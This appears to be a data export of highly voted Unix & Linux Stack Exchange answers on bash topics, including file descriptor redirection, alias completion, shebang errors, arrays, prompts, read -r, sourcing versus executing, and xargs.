"When would you use an additional file descriptor?","18899","<bash><shell><io-redirection><file-descriptors>","89","<p>Most commands have a single input channel (standard input, file descriptor 0) and a single output channel (standard output, file descriptor 1) or else operate on several files which they open by themselves (so you pass them a file name). (That's in addition from standard error (fd 2), which usually filters up all the way to the user.) It is however sometimes convenient to have a command that acts as a filter from several sources or to several targets. For example, here's a simple script that separates the odd-numbered lines in a file from the even-numbered ones</p>

<pre><code>while IFS= read -r line; do
  printf '%s\n' ""$line""
  if IFS= read -r line; then printf '%s\n' ""$line"" &gt;&amp;3; fi
done &gt;odd.txt 3&gt;even.txt
</code></pre>

<p>Now suppose you want to apply a different filter to the odd-number lines and to the even-numbered lines (but not put them back together, that would be a different problem, not feasible from the shell in general). In the shell, you can only pipe a command's standard output to another command; to pipe another file descriptor, you need to redirect it to fd 1 first.</p>

<pre><code>{ while … done | odd-filter &gt;filtered-odd.txt; } 3&gt;&amp;1 | even-filter &gt;filtered-even.txt
</code></pre>

<p>Another, simpler use case is <a href=""https://unix.stackexchange.com/questions/3514/how-to-grep-standard-error-stream-stderr/3540#3540"">filtering the error output of a command</a>.</p>

<p><code>exec M&gt;&amp;N</code> redirects a file descriptor to another one for the remainder of the script (or until another such command changes the file descriptors again). There is some overlap in functionality between <code>exec M&gt;&amp;N</code> and <code>somecommand M&gt;&amp;N</code>. The <code>exec</code> form is more powerful in that it does not have to be nested:</p>

<pre><code>exec 8&lt;&amp;0 9&gt;&amp;1
exec &gt;output12
command1
exec &lt;input23
command2
exec &gt;&amp;9
command3
exec &lt;&amp;8
</code></pre>

<p>Other examples that may be of interest:</p>

<ul>
<li><a href=""https://unix.stackexchange.com/questions/42728/what-does-31-12-23-do-in-a-script"">What does “3>&amp;1 1>&amp;2 2>&amp;3” do in a script?</a> (it swaps stdout with stderr)</li>
<li><a href=""https://unix.stackexchange.com/questions/13724/file-descriptors-shell-scripting/13726#13726"">File descriptors &amp; shell scripting</a></li>
<li><a href=""https://unix.stackexchange.com/questions/11946/how-big-is-the-pipe-buffer/11954#11954"">How big is the pipe buffer?</a></li>
<li><a href=""https://unix.stackexchange.com/questions/4806/bash-script-testing-if-a-command-has-run-correctly/4808#4808"">Bash script testing if a command has run correctly</a></li>
</ul>

<p>And for even more examples:</p>

<ul>
<li><a href=""https://unix.stackexchange.com/questions/tagged/io-redirection"">questions tagged <code>io-redirection</code></a></li>
<li><a href=""https://unix.stackexchange.com/questions/tagged/file-descriptors"">questions tagged <code>file-descriptors</code></a></li>
<li><a href=""http://data.stackexchange.com/unix%20and%20linux/s/1740/examples-of-shell-redirections-involving-file-descriptors-3-and-above"" rel=""noreferrer"">search for examples on this site</a> in the <a href=""http://data.stackexchange.com/"" rel=""noreferrer"">Data Explorer</a> (a public read-only copy of the Stack Exchange database)</li>
</ul>

<p><sub> P.S. This is a surprising question coming from the author of the <a href=""https://unix.stackexchange.com/questions/6430/how-to-redirect-stderr-out-to-different-files-and-also-display-in-terminal/6431#6431"">most upvoted post on the site that uses redirection through fd 3</a>!</sub></p>
"
"How do I get bash completion for command aliases?","4219","<bash><alias><autocomplete>","88","<p>There is <a href=""http://ubuntuforums.org/showthread.php?t=733397"">a great thread about this on the Ubuntu forums</a>. Ole J proposes the following alias completion definition function:</p>

<pre><code>function make-completion-wrapper () {
  local function_name=""$2""
  local arg_count=$(($#-3))
  local comp_function_name=""$1""
  shift 2
  local function=""
    function $function_name {
      ((COMP_CWORD+=$arg_count))
      COMP_WORDS=( ""$@"" \${COMP_WORDS[@]:1} )
      ""$comp_function_name""
      return 0
    }""
  eval ""$function""
  echo $function_name
  echo ""$function""
}
</code></pre>

<p>Use it to define a completion function for your alias, then specify that function as a completer for the alias:</p>

<pre><code>make-completion-wrapper _apt_get _apt_get_install apt-get install
complete -F _apt_get_install apt-inst
</code></pre>

<p>I prefer to use aliases for adding always-used arguments to existing programs. For instance, with <code>grep</code>, I always want to skip devices and binary files, so I make an alias for <code>grep</code>. For adding new commands such as <code>grepbin</code>, I use a shell script in my <code>~/bin</code> folder. If that folder is in your path, it will get autocompleted.</p>
"
"#!/bin/bash - no such file or directory","27054","<bash><shell-script><executable><shebang>","88","<p>This kind of message is usually due to a bogus shebang line, either an extra carriage return at the end of the first line or a BOM at the beginning of it.</p>

<p>Run: </p>

<pre><code>$ head -1 yourscript | od -c
</code></pre>

<p>and see how it ends.  </p>

<p>This is wrong:</p>

<pre><code>0000000   #   !   /   b   i   n   /   b   a   s   h  \r  \n
</code></pre>

<p>This is wrong too:</p>

<pre><code>0000000 357 273 277   #   !   /   b   i   n   /   b   a   s   h  \n
</code></pre>

<p>This is correct:</p>

<pre><code>0000000   #   !   /   b   i   n   /   b   a   s   h  \n
</code></pre>

<p>Use <code>dos2unix</code> (or <code>sed</code>, <code>tr</code>, <code>awk</code>, <code>perl</code>, <code>python</code>…) to fix your script if this is the issue.</p>

<p>Here is one that will remove both of a BOM and tailing CRs:</p>

<pre><code>sed -i '1s/^.*#//;s/\r$//' brokenScript
</code></pre>

<p><hr/>
Note that the shell you are using to run the script will slightly affect the error messages that are displayed.</p>

<p>Here are three scripts just showing their name (<code>echo $0</code>) and having the following respective shebang lines:</p>

<p>correctScript:</p>

<pre><code>0000000   #   !   /   b   i   n   /   b   a   s   h  \n
</code></pre>

<p>scriptWithBom:</p>

<pre><code>0000000 357 273 277   #   !   /   b   i   n   /   b   a   s   h  \n
</code></pre>

<p>scriptWithCRLF:</p>

<pre><code>0000000   #   !   /   b   i   n   /   b   a   s   h  \r  \n
</code></pre>

<p>Under bash, running them will show these messages:</p>

<pre><code>$ ./correctScript
./correctScript
$ ./scriptWithCRLF
bash: ./scriptWithCRLF: /bin/bash^M: bad interpreter: No such file or directory
$ ./scriptWithBom
./scriptWithBom: line 1: #!/bin/bash: No such file or directory
./scriptWithBom
</code></pre>

<p>Running the bogus ones by explicitely calling the interpreter allows the CRLF script to run without any issue:</p>

<pre><code>$ bash ./scriptWithCRLF
./scriptWithCRLF
$ bash ./scriptWithBom
./scriptWithBom: line 1: #!/bin/bash: No such file or directory
./scriptWithBom
</code></pre>

<p>Here is the behavior observed under <code>ksh</code>:</p>

<pre><code>$ ./scriptWithCRLF
ksh: ./scriptWithCRLF: not found [No such file or directory]
$ ./scriptWithBom
./scriptWithBom[1]: #!/bin/bash: not found [No such file or directory]
./scriptWithBom
</code></pre>

<p>and under <code>dash</code>:</p>

<pre><code>$ ./scriptWithCRLF
dash: 2: ./scriptWithCRLF: not found
$ ./scriptWithBom
./scriptWithBom: 1: ./scriptWithBom: #!/bin/bash: not found
./scriptWithBom
</code></pre>
"
"Is there a way of reading the last element of an array with bash?","198787","<bash><array>","88","<p><a href=""https://github.com/bminor/bash/blob/36f2c40/CHANGES#L3034-L3035"" rel=""noreferrer"">As of bash 4.2</a>, you can just <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Arrays"" rel=""noreferrer"">use a negative index</a> <code>${myarray[-1]}</code> to get the last element. You can do the same thing for the second-last, and so on; in Bash:</p>
<blockquote>
<p>If the subscript used to reference an element of an indexed array
evaluates to a number less than zero, it is interpreted as relative to
one greater than the maximum index of the array, so negative indices
count back from the end of the array, and an index of -1 refers to the
last element.</p>
</blockquote>
<p>The same also works for assignment. When it says &quot;expression&quot; it really means an expression; you can write in any arithmetic expression there to compute the index, including one that computes using the length of the array <code>${#myarray[@]}</code> explicitly like <code>${myarray[${#myarray[@]} - 1]}</code> for earlier versions.</p>
"
"Awesome symbols and characters in a bash prompt","25903","<bash><prompt><unicode>","87","<p>You can use any printable character, bash doesn't mind. You'll probably want to configure your terminal to support <a href=""http://en.wikipedia.org/wiki/Unicode"" rel=""noreferrer"">Unicode</a> (in the form of <a href=""http://en.wikipedia.org/wiki/UTF-8"" rel=""noreferrer"">UTF-8</a>).</p>

<p>There are a lot of characters in Unicode, so here are a few tips to help you search through the Unicode charts:</p>

<ul>
<li>You can try to draw the character on <a href=""http://shapecatcher.com/"" rel=""noreferrer"">Shapecatcher</a>. It tries to recognize a Unicode character in what you draw.</li>
<li>You can try to figure out which block the character is in. For example, that weird-looking symbol and that star would be in a block of miscellaneous symbols; characters like <code>Ǫ</code> and <code>ı</code> are latin letters with modifiers; <code>∉</code> is a mathematical symbol, and so on.</li>
<li>You can try to think of a word in the description of the character and look for it in a list of unicode symbol names and descriptions. <a href=""http://live.gnome.org/Gucharmap"" rel=""noreferrer"">Gucharmap</a> or <a href=""http://utils.kde.org/projects/kcharselect/"" rel=""noreferrer"">Kcharselect</a> can help.</li>
</ul>

<p>P.S. On Shapecatcher, I got <a href=""http://shapecatcher.com/unicode_info/8756.html"" rel=""noreferrer"">U+2234 THEREFORE</a> for <code>∴</code>, <a href=""http://shapecatcher.com/unicode_info/8594.html"" rel=""noreferrer"">U+2192 RIGHTWARDS ARROW</a> for <code>→</code>, <a href=""http://shapecatcher.com/unicode_info/9791.html"" rel=""noreferrer"">U+263F MERCURY</a> for <code>☿</code> and <a href=""http://shapecatcher.com/unicode_info/9733.html"" rel=""noreferrer"">U+2605 BLACK STAR</a> for <code>★</code>.</p>

<p>In a bash script, up to bash 4.1, you can write a byte by its code point, but not a character. If you want to avoid non-ASCII characters to make your <code>.bashrc</code> resilient to file encoding changes, you'll need to enter the bytes corresponding to these characters in the UTF-8 encoding. You can see the hexidecimal values by running <code>echo ∴ → ☿ ★ | hexdump -C</code> in a UTF-8 terminal, e.g. <code>∴</code> is encoded by <code>\xe2\x88\xb4</code> in UTF-8.</p>

<pre><code>if [[ $LC_CTYPE =~ '\.[Uu][Tt][Ff]-?8' ]]; then
  PS1=$'\\[\e[31m\\]\xe2\x88\xb4\\[\e[0m\\]\n\xe2\x86\x92 \xe2\x98\xbf \\~ \\[\e[31m\\]\xe2\x98\x85 $? \\[\e[0m\\]'
fi
</code></pre>

<p>Since bash 4.2, you can use <code>\u</code> followed by 4 hexadecimal digits in a <code>$'…'</code> string.</p>

<pre><code>  PS1=$'\\[\e[31m\\]\u2234\\[\e[0m\\]\n\u2192 \u263f \\~ \\[\e[31m\\]\u2605 $? \\[\e[0m\\]'
</code></pre>
"
"How can I assign the output of a command to a shell variable?","16024","<bash><shell-script><io-redirection><variable>","87","<p>A shell assignment is a single word, with no space after the equal sign. So what you wrote assigns an empty value to <code>thefile</code>; furthermore, since the assignment is grouped with a command, it makes <code>thefile</code> an environment variable and the assignment is local to that particular command, i.e. only the call to <code>ls</code> sees the assigned value.</p>

<p>You want to capture the output of a command, so you need to use <a href=""http://tldp.org/LDP/abs/html/commandsub.html"">command substitution</a>:</p>

<pre><code>thefile=$(ls -t -U | grep -m 1 ""Screen Shot"")
</code></pre>

<p>(Some literature shows an alternate syntax <code>thefile=`ls …`</code>; the backquote syntax is equivalent to the dollar-parentheses syntax except that quoting inside backquotes is weird sometimes, so just use <code>$(…)</code>.)</p>

<p>Other remarks about your script:</p>

<ul>
<li>Combining <code>-t</code> (sort by time) with <code>-U</code> (don't sort) doesn't make sense; just use <code>-t</code>.</li>
<li><p>Rather than using <code>grep</code> to match screenshots, it's clearer to pass a wildcard to <code>ls</code> and use <code>head</code> to capture the first file:</p>

<pre><code>thefile=$(ls -t *""Screen Shot""* | head -n 1)
</code></pre></li>
<li><p>It's generally a <a href=""http://mywiki.wooledge.org/ParsingLs"">bad idea to parse the output of <code>ls</code></a>. This could fail quite badly if you have file names with nonprintable characters. However, sorting files by date is difficult without <code>ls</code>, so it's an acceptable solution if you know you won't have unprintable characters or backslashes in file names.</p></li>
<li><p><strong>Always use double quotes around variable substitutions</strong>, i.e. here write</p>

<pre><code>echo ""Most recent screenshot is: $thefile""
</code></pre>

<p>Without double quotes, the value of the variable is reexpanded, which will cause trouble if it contains whitespace or other special characters.</p></li>
<li>You don't need semicolons at the end of a line. They're redundant but harmless.</li>
<li>In a shell script, it's often a good idea to include <a href=""http://www.davidpashley.com/articles/writing-robust-shell-scripts.html""><code>set -e</code></a>. This tells the shell to exit if any command fails (by returning a nonzero status).</li>
</ul>

<p>If you have GNU find (in particular if you're running non-embedded Linux or Cygwin), there's another approach to finding the most recent file: have <code>find</code> list the files and their dates, and use <code>sort</code> and <code>tail</code> to extract the youngest file.</p>

<pre><code>thefile=$(find -maxdepth 1 -type f -name ""*Screen Shot*"" -printf ""%T@ %p"" |
          sort -k 1n | tail -n 1)
</code></pre>

<p>If you're willing to write this script in zsh instead of bash, there's a much easier way to catch the newest file, because zsh has <a href=""http://zsh.sourceforge.net/Doc/Release/Expansion.html#Glob-Qualifiers"">glob qualifiers</a> that permit wildcard matches not only on names but also on file metadata. The <code>(om[1])</code> part after the pattern is the glob qualifiers; <code>om</code> sorts matches by increasing age (i.e. by modification time, newest first) and <code>[1]</code> extracts the first match only. The whole match needs to be in parentheses because it's technically an array, since globbing returns a list of files, even if the <code>[1]</code> means that in this particular case the list contains (at most) one file.</p>

<pre><code>#!/bin/zsh
set -e
cd ~/Desktop
thefile=(*""Screen Shot""*(om[1]))
echo ""Most recent screenshot is: $thefile""
</code></pre>
"
"Search for a previous command with the prefix I just typed","231605","<bash><shell><command-history>","87","<p>What you are looking for is <kbd>Ctrl</kbd><kbd>R</kbd>.</p>

<p>Type <kbd>Ctrl</kbd><kbd>R</kbd> and then type part of the command you want.  Bash will display the first matching command.  Keep typing <kbd>Ctrl</kbd><kbd>R</kbd> and bash will cycle through previous matching commands.</p>

<p>To search backwards in the history, type <kbd>Ctrl</kbd><kbd>S</kbd> instead.  (If <kbd>Ctrl</kbd><kbd>S</kbd> doesn't work that way for you, that likely means that you need to disable  XON/XOFF flow control: to do that, run <code>stty -ixon</code>.)</p>

<p>This is documented under ""Searching"" in <code>man bash</code>.</p>
"
"Can I somehow add a ""&& prog2"" to an already running prog1?","100801","<bash><shell><process><exit>","87","<p>You should be able to do this in the same shell you're in with the <code>wait</code> command:</p>

<pre><code>$ sleep 30 &amp;
[1] 17440

$ wait 17440 &amp;&amp; echo hi

...30 seconds later...
[1]+  Done                    sleep 30
hi
</code></pre>

<p><em>excerpt from Bash man page</em></p>

<pre class=""lang-none prettyprint-override""><code>wait [n ...]
     Wait for each specified process and return its termination status. Each n 
     may be a process ID or a job specification; if a job spec is given,  all 
     processes  in that job's pipeline are waited for.  If n is not given, all 
     currently active child processes are waited for, and the return status is 
     zero.  If n specifies a non-existent process or job, the return status is 
     127.  Otherwise, the return status is the exit status of the last process 
     or job waited for.
</code></pre>
"
"Show sum of file sizes in directory listing","72661","<bash><shell-script><awk><ls>","86","<p>The following function does most of what you're asking for:</p>

<pre><code>dir () { ls -FaGl ""${@}"" | awk '{ total += $4; print }; END { print total }'; }
</code></pre>

<p>... but it won't give you what you're asking for from <code>dir -R *.jpg *.tif</code>, because that's not how <code>ls -R</code> works. You might want to play around with the <a href=""http://unixhelp.ed.ac.uk/CGI/man-cgi?find""><code>find</code></a> utility for that.</p>
"
"What is the difference between ~/.profile and ~/.bash_profile?","45684","<bash><profile>","86","<p>The <code>.profile</code> was the original profile configuration for the Bourne shell (a.k.a., <code>sh</code>). <code>bash</code>, being a Bourne compatible shell will read and use it. The <code>.bash_profile</code> on the other hand is only read by <code>bash</code>. It is intended for commands that are incompatible with the standard Bourne shell.</p>
"
"Are all bash scripts compatible with `zsh`?","38172","<bash><zsh>","86","<p>If your scripts start with the line <code>#!/bin/bash</code> they will still be run using bash, even if your default shell is zsh.</p>

<p>I've found the syntax of zsh really close to the one of bash, and I did not pay attention if there was really some incompatibilities. I switched 6 years ago from bash to zsh seamlessly.</p>
"
"What's the difference between $@ and $*","129072","<bash><shell>","85","<p>They aren't the same.  <code>$*</code> is a single string, whereas <code>$@</code> is an actual array.  To see the difference, execute the following script like so:</p>
<pre><code> &gt; ./test.sh one two &quot;three four&quot;
</code></pre>
<p>The script:</p>
<pre><code>#!/bin/bash

echo &quot;Using \&quot;\$*\&quot;:&quot;
for a in &quot;$*&quot;; do
    echo $a;
done

echo -e &quot;\nUsing \$*:&quot;
for a in $*; do
    echo $a;
done

echo -e &quot;\nUsing \&quot;\$@\&quot;:&quot;
for a in &quot;$@&quot;; do
    echo $a;
done

echo -e &quot;\nUsing \$@:&quot;
for a in $@; do
    echo $a;
done              
</code></pre>
<p>The explanation and the results for the four cases are below.</p>
<p>In the first case, the parameters are regarded as one long <em>quoted</em> string:</p>
<pre><code>Using &quot;$*&quot;:
one two three four
</code></pre>
<p>Case 2 (unquoted) - the string is broken into words by the <code>for</code> loop:</p>
<pre><code>Using $*:
one
two
three
four
</code></pre>
<p>Case 3 - it treats each element of $@ as a quoted string:</p>
<pre><code>Using &quot;$@&quot;:
one
two
three four
</code></pre>
<p>Last case - it treats each element as an unquoted string, so the last one is again split by  what amounts to <code>for three four</code>:</p>
<pre><code>Using $@:
one
two
three
four
</code></pre>
"
"How do I check if a variable exists in an 'if' statement?","212183","<bash><variable><test>","85","<p>In modern bash (version 4.2 and above):</p>

<pre><code>[[ -v name_of_var ]]
</code></pre>

<p>From <code>help test</code>:</p>

<blockquote>
  <p>-v VAR, True if the shell variable VAR is set</p>
</blockquote>
"
"Set and Shopt - Why Two?","32409","<bash><settings><shopt>","84","<p>As far as I know, the <code>set -o</code> options are the ones that are inherited from other Bourne-style shells (mostly ksh), and the <code>shopt</code> options are the ones that are specific to bash. There's no logic that I know of.</p>
"
"How do I check if a file is a symbolic link to a directory?","96907","<bash><shell><test>","84","<p>Just combine the two tests with <code>&amp;&amp;</code>:</p>

<pre><code>if [[ -L ""$file"" &amp;&amp; -d ""$file"" ]]
then
    echo ""$file is a symlink to a directory""
fi
</code></pre>
"
"Make cd follow symbolic links","55713","<bash><symlink><cd-command>","84","<p>With any POSIX implementation of <code>cd</code>, you can use the <code>-P</code> option to do this.</p>

<pre><code>$ help cd
...
    -P      use the physical directory structure without following symbolic links
...
</code></pre>

<p>You can see it in action here:</p>

<pre><code>$ mkdir foo
$ ln -s foo bar
$ cd -P bar
$ pwd
/tmp/tmp.WkupF2Ucuh/foo
</code></pre>

<p>If you want this to be the default behaviour, you can either create an alias for <code>cd</code>, like so:</p>

<pre><code>alias cd='cd -P'
</code></pre>

<p>...or use <code>set -o physical</code>. For tcsh, the equivalent command is <code>set symlinks=chase</code>.</p>
"
"how to count the length of an array defined in bash?","193039","<bash><array>","83","<p>You can access the array indices using <code>${!array[@]}</code> and the length of the array using <code>${#array[@]}</code>, e.g. :</p>

<pre><code>#!/bin/bash

array=( item1 item2 item3 )
for index in ${!array[@]}; do
    echo $index/${#array[@]}
done
</code></pre>

<p>Note that since bash arrays are <em>zero indexed</em>, you will actually get :</p>

<pre><code>0/3
1/3
2/3
</code></pre>

<p>If you want the count to run from 1 you can replace <code>$index</code> by <code>$((index+1))</code>. If you want the <em>values</em> as well as the indices you can use <code>""${array[index]}""</code> i.e.</p>

<pre><code>#!/bin/bash

array=( item1 item2 item3 )
for index in ${!array[@]}; do
    echo $((index+1))/${#array[@]} = ""${array[index]}""
done
</code></pre>

<p>giving</p>

<pre><code>1/3 = item1
2/3 = item2
3/3 = item3
</code></pre>
"
"How do I force yum to install without prompting the user, using bash?","84310","<bash><yum><rpm>","83","<p>You can use the <code>-y</code> switch:</p>

<pre><code>$ yum -y install php54w
</code></pre>

<em>excerpt from the <a href=""http://linux.die.net/man/8/yum"">yum man page</a></em>

<pre><code>-y, --assumeyes
      Assume yes; assume that the answer to any question which would be asked
      is yes. Configuration Option: assumeyes
</code></pre>
"
"Why is setting a variable before a command legal in bash?","126938","<bash><shell><environment-variables>","83","<p>Relevant information can be found on the <a href=""https://tiswww.case.edu/php/chet/bash/bash.html"" rel=""nofollow noreferrer"">man page</a> provided by the BASH maintainer (last checked August 2020). Section Shell Grammar, Simple Commands states (emphasis added):</p>
<blockquote>
<p>A simple command is a <strong>sequence of optional  variable  assignments</strong>  followed  by  blank-separated  <strong>words and redirections</strong>, and terminated by a control operator.  The <strong>first word</strong> specifies the command to be executed, and  is  passed  as  argument  zero.  The remaining words are passed as arguments to the invoked command.</p>
</blockquote>
<p>So you can pass any variable you'd like. Your <code>echo</code> example does not work because the variables are passed to the command, not set in the shell. The shell expands <code>$x</code> and <code>$y</code> <em>before</em> invoking the command. This works, for example:</p>
<pre><code>$ x=&quot;once upon&quot; y=&quot;a time&quot; bash -c 'echo $x $y'
once upon a time
</code></pre>
"
"How can I tell whether a package is installed via yum in a bash script?","122681","<bash><shell-script><package-management><yum>","83","<p>I found the following on a semi-related <a href=""https://stackoverflow.com/questions/8447011/how-to-ensure-yum-install-was-successful-in-a-shell-script"">StackOverflow question</a>; the answer I needed didn't actually quite answer the question there (and was not selected as the correct answer) so I figured I'd post it here for others to find easier.</p>

<p><code>yum list installed PACKAGE_NAME</code></p>

<p>This command returns some human-readable output, but more importantly returns an exit status code; 0 indicates the package <em>is</em> installed, 1 indicates the package is <em>not</em> installed (does not check whether the package is valid, so <code>yum list installed herpderp-beepbopboop</code> will return a ""1"" just as <code>yum list installed traceroute</code> will if you don't have traceroute installed). You can subsequently check ""$?"" for this exit code. </p>

<p>Since the output is somewhat counter-intuitive, I used @Chris Downs' ""condensed"" version below in a wrapper function to make the output more ""logical"" (i.e. 1=installed 0=not installed):</p>

<pre><code>function isinstalled {
  if yum list installed ""$@"" &gt;/dev/null 2&gt;&amp;1; then
    true
  else
    false
  fi
}
</code></pre>

<p>usage would be</p>

<p><code>if isinstalled $package; then echo ""installed""; else echo ""not installed""; fi</code></p>

<h3>EDIT:</h3>

<p>Replaced <code>return</code> statements with calls to <code>true</code> and <code>false</code> which help make the function more readable/intuitive, while returning the values bash expects (i.e. 0 for true, 1 for false).</p>

<p>If you're just checking for one package in your script, you may just be better off testing <code>yum list installed</code> directly, but (IMHO) the function makes it easier to understand what's going on, and its syntax is much easier to remember than <code>yum</code> with all the redirects to supress its output.</p>
"
"Why ZSH ends a line with a highlighted percent symbol?","167582","<bash><zsh><prompt><newlines>","83","<p>Yes, this happens because it is a ""partial line"". And by default <a href=""http://zsh.sourceforge.net/Doc/Release/Options.html#Prompting"">zsh goes to the next line to avoid covering it with the prompt</a>.</p>

<blockquote>
  <p>When a partial line is preserved, by default you will see an
  inverse+bold character at the end of the partial line: a ""%"" for a
  normal user or a ""#"" for root. If set, the shell parameter
  PROMPT_EOL_MARK can be used to customize how the end of partial lines
  are shown.</p>
</blockquote>
"
"Understanding ""IFS= read -r line""","209123","<bash><shell-script>","82","<p>In POSIX shells, <code>read</code>, without any option doesn't read a <em>line</em>, it reads <em>words</em> from a (possibly backslash-continued) line, where words are <code>$IFS</code> delimited and backslash can be used to escape the delimiters (or continue lines).</p>

<p>The generic syntax is:</p>

<pre><code>read word1 word2... remaining_words
</code></pre>

<p><code>read</code> reads stdin one byte at a time¹ until it finds an unescaped newline character (or end-of-input), splits that according to complex rules and stores the result of that splitting into <code>$word1</code>, <code>$word2</code>... <code>$remaining_words</code>.</p>

<p>For instance on an input like:</p>

<pre><code>  &lt;tab&gt; foo bar\ baz   bl\ah   blah\
whatever whatever
</code></pre>

<p>and with the default value of <code>$IFS</code>, <code>read a b c</code> would assign:</p>

<ul>
<li><code>$a</code> ⇐ <code>foo</code></li>
<li><code>$b</code> ⇐ <code>bar baz</code></li>
<li><code>$c</code> ⇐ <code>blah   blahwhatever whatever</code></li>
</ul>

<p>Now if passed only one argument, that doesn't become <code>read line</code>. It's still <code>read remaining_words</code>. Backslash processing is still done, IFS whitespace characters are still removed from the beginning and end.</p>

<p>The <code>-r</code> option removes the backslash processing. So that same command above with <code>-r</code> would instead assign</p>

<ul>
<li><code>$a</code> ⇐ <code>foo</code></li>
<li><code>$b</code> ⇐ <code>bar\</code></li>
<li><code>$c</code> ⇐ <code>baz   bl\ah   blah\</code></li>
</ul>

<p>Now, for the splitting part, it's important to realise that there are two classes of characters for <code>$IFS</code>: the IFS whitespace characters (namely space and tab (and newline, though here that doesn't matter unless you use -d), which also happen to be in the default value of <code>$IFS</code>) and the others. The treatment for those two classes of characters is different.</p>

<p>With <code>IFS=:</code> (<code>:</code> being not an IFS whitespace character), an input like <code>:foo::bar::</code> would be split into <code>""""</code>, <code>""foo""</code>, <code>""""</code>, <code>bar</code> and <code>""""</code> (and an extra <code>""""</code> with some implementations though that doesn't matter except for <code>read -a</code>). While if we replace that <code>:</code> with space, the splitting is done into only <code>foo</code> and <code>bar</code>. That is leading and trailing ones are ignored, and sequences of them are treated like one. There are additional rules when whitespace and non-whitespace characters are combined in <code>$IFS</code>. Some implementations can add/remove the special treatment by doubling the characters in IFS (<code>IFS=::</code> or <code>IFS='  '</code>).</p>

<p>So here, if we don't want the leading and trailing unescaped whitespace characters to be stripped, we need to remove those IFS white space characters from IFS.</p>

<p>Even with IFS-non-whitespace characters, if the input line contains one (and only one) of those characters and it's the last character in the line (like <code>IFS=: read -r word</code> on a input like <code>foo:</code>) with POSIX shells (not <code>zsh</code> nor some <code>pdksh</code> versions), that input is considered as one <code>foo</code> word because in those shells, the characters <code>$IFS</code> are considered as <em>terminators</em>, so <code>word</code> will contain <code>foo</code>, not <code>foo:</code>.</p>

<p>So, the canonical way to read one line of input with the <code>read</code> builtin is:</p>

<pre><code>IFS= read -r line
</code></pre>

<p>(note that for most <code>read</code> implementations, that only works for text lines as the NUL character is not supported except in <code>zsh</code>).</p>

<p>Using <code>var=value cmd</code> syntax makes sure <code>IFS</code> is only set differently for the duration of that <code>cmd</code> command.</p>

<h3>History note</h3>

<p>The <code>read</code> builtin was introduced by the Bourne shell and was already to read <em>words</em>, not lines. There are a few important differences with modern POSIX shells.</p>

<p>The Bourne shell's <code>read</code> didn't support a <code>-r</code> option (which was introduced by the Korn shell), so there's no way to disable backslash processing other than pre-processing the input with something like <code>sed 's/\\/&amp;&amp;/g'</code> there.</p>

<p>The Bourne shell didn't have that notion of two classes of characters (which again was introduced by ksh). In the Bourne shell all characters undergo the same treatment as IFS whitespace characters do in ksh, that is <code>IFS=: read a b c</code> on an input like <code>foo::bar</code> would assign <code>bar</code> to <code>$b</code>, not the empty string.</p>

<p>In the Bourne shell, with:</p>

<pre><code>var=value cmd
</code></pre>

<p>If <code>cmd</code> is a built-in (like <code>read</code> is), <code>var</code> remains set to <code>value</code> after <code>cmd</code> has finished. That's particularly critical with <code>$IFS</code> because in the Bourne shell, <code>$IFS</code> is used to split everything, not only the expansions. Also, if you remove the space character from <code>$IFS</code> in the Bourne shell, <code>""$@""</code> no longer works.</p>

<p>In the Bourne shell, redirecting a compound command causes it to run in a subshell (in the earliest versions, even things like <code>read var &lt; file</code> or <code>exec 3&lt; file; read var &lt;&amp;3</code> didn't work), so it was rare in the Bourne shell to use <code>read</code> for anything but user input on the terminal (where that line continuation handling made sense)</p>

<p>Some Unices (like HP/UX, there's also one in <code>util-linux</code>) still have a <code>line</code> command to read one line of input (that used to be a standard UNIX command up until <a href=""http://pubs.opengroup.org/onlinepubs/7908799/xcu/line.html"" rel=""noreferrer"">the Single UNIX Specification version 2</a>).</p>

<p>That's basically the same as <code>head -n 1</code> except that it reads one byte at a time to make sure it doesn't read more than one line. On those systems, you can do:</p>

<pre><code>line=`line`
</code></pre>

<p>Of course, that means spawning a new process, execute a command and read its output through a pipe, so a lot less efficient than ksh's <code>IFS= read -r line</code>, but still a lot more intuitive.</p>

<hr>

<p><sup>¹ though on seekable input, some implementations can revert to reading by blocks and seek-back afterwards as an optimisation. ksh93 goes even further and remembers what was read and uses it for the next <code>read</code> invocation, though <a href=""https://github.com/att/ast/issues/15"" rel=""noreferrer"">that's currently broken</a></sup></p>
"
"What is the difference between sourcing ('.' or 'source') and executing a file in bash?","43882","<bash><shell>","82","<p><code>./test.sh</code> runs <code>test.sh</code> as a separate program. It may happen to be a bash script, if the file <code>test.sh</code> starts with <code>#!/bin/bash</code>. But it could be something else altogether.</p>

<p><code>. ./test.sh</code> executes the code of the file <code>test.sh</code> inside the running instance of bash. It works as if the content file <code>test.sh</code> had been included textually instead of the <code>. ./test.sh</code> line. (Almost: there are a few details that differ, such as the value of <code>$BASH_LINENO</code>, and the behavior of the <code>return</code> builtin.)</p>

<p><code>source ./test.sh</code> is identical to <code>. ./test.sh</code> in bash (in other shells, <code>source</code> may be slightly different or not exist altogether; <code>.</code> for inclusion is in the POSIX standard).</p>

<p>The most commonly visible difference between running a separate script with <code>./test.sh</code> and including a script with the <code>.</code> builtin is that if the <code>test.sh</code> script sets some environment variables, with a separate process, only the environment of the child process is set, whereas with script inclusion, the environment of the sole shell process is set. If you add a line <code>foo=bar</code> in <code>test.sh</code> and <code>echo $foo</code> at the end of the calling script, you'll see the difference:</p>

<pre><code>$ cat test.sh
#!/bin/sh
foo=bar
$ ./test.sh
$ echo $foo

$ . ./test.sh
$ echo $foo
bar
</code></pre>
"
"Solving ""mv: Argument list too long""?","128559","<bash><shell><arguments><mv>","81","<p><a href=""http://linux.die.net/man/1/xargs""><code>xargs</code></a> is the tool for the job. That, or <a href=""http://linux.die.net/man/1/find""><code>find</code></a> with <code>-exec … {} +</code>. These tools run a command several times, with as many arguments as can be passed in one go.</p>

<p>Both methods are easier to carry out when the variable argument list is at the end, which isn't the case here: the final argument to <code>mv</code> is the destination. With GNU utilities (i.e. on non-embedded Linux or Cygwin), the <code>-t</code> option to <code>mv</code> is useful, to pass the destination first.</p>

<p>If the file names have no whitespace nor any of <code>\""'</code>, then you can simply provide the file names as input to <code>xargs</code> (the <code>echo</code> command is a bash builtin, so it isn't subject to the command line length limit):</p>

<pre><code>echo !(*.jpg|*.png|*.bmp) | xargs mv -t targetdir
</code></pre>

<p>You can use the <code>-0</code> option to <code>xargs</code> to use null-delimited input instead of the default quoted format.</p>

<pre><code>printf '%s\0' !(*.jpg|*.png|*.bmp) | xargs -0 mv -t targetdir
</code></pre>

